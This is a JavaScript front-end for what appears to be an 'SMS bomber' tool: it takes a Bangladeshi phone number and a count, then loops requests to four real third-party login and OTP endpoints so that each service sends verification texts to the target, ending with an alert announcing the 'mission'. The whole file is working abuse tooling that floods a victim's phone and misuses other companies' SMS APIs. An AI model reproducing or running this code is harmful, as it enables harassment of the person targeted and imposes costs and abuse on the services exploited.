$('#phone').on('focusin', function () {
    $('.number_text').attr('id', 'positionChange');
});

$('#phone').on('focusout', function () {
    if (!this.value) {
        $('.number_text').removeAttr('id');
    }
});

$('#amount').on('focusin', function () {
    $('.amount_text').attr('id', 'positionChange');
});

$('#amount').on('focusout', function () {
    if (!this.value) {
        $('.amount_text').removeAttr('id');
    }
});

$('#submit').click(() => {
    const number = $('#phone').val();
    const amount = $('#amount').val();

    if (number.length !== 11) {
        alert("wrong number");
    } else if (amount.length === 0) {
        alert("wrong amount");
    } else {
        let i = 0;
        while (i < amount) {
            // First Axios request
            var data1 = JSON.stringify({
                "mobileNumber": "88" + number + "",
                "countryId": 22
            });
            var config1 = {
                method: 'post',
                url: 'https://api.englishmojabd.com/api/v1/auth/login',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: data1
            };
            axios(config1).then(function (response) {
                console.log(JSON.stringify(response.data));
            }).catch(function (error) {
                console.log(error);
            });
            i++;

            // Second Axios request
            var data2 = JSON.stringify({
                "phone": "+88" + number + ""
            });
            var config2 = {
                method: 'post',
                url: 'https://api.eat-z.com/auth/customer/signin',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: data2
            };
            axios(config2).then(function (response) {
                console.log(JSON.stringify(response.data));
                i++;
            }).catch(function (error) {
                console.log(error);
            });
            i++;

            // Third Axios request
            var config3 = {
                method: 'get',
                url: 'http://apibeta.iqra-live.com/api/v2/sent-otp/' + number,
                headers: {
                    'x-user-channel': 'apps'
                }
            };
            axios(config3).then(function (response) {
                console.log(JSON.stringify(response.data));
            }).catch(function (error) {
                console.log(error);
            });
            i++;

            // Fourth Axios request
            var data4 = JSON.stringify({
                "phone": "" + number + "",
                "country_code": "+880",
                "fcm_token": null
            });
            var config4 = {
                method: 'post',
                url: 'https://developer.quizgiri.xyz/api/v2.0/send-otp',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: data4
            };
            axios(config4).then(function (response) {
                console.log(JSON.stringify(response.data));
            }).catch(function (error) {
                console.log(error);
            });

        }
        alert(`${amount} SMS Sent. Keep the Browser Three minutes for complete your mission.`);
    }
});
